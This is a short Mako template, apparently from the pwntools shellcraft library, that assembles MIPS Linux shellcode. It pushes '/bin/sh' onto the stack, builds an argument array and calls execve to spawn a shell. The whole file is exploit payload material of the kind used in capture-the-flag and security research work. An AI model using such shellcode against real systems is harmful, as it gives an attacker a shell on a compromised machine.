<%
    from pwnlib.shellcraft import mips
    from pwnlib.shellcraft import common
%>\
<%docstring>Execute /bin/sh</%docstring>
${mips.pushstr('/bin/sh', True)}

/* {"/bin/sh", 0} */
sw $sp, -8($sp)
${mips.mov('$a2', 0)}
sw $a2, -4($sp)

lw $a0, -8($sp)
add $sp, $sp, -8
${mips.mov('$a1', '$sp')}

${mips.linux.syscall('SYS_execve', '$a0', '$a1', '$a2')}
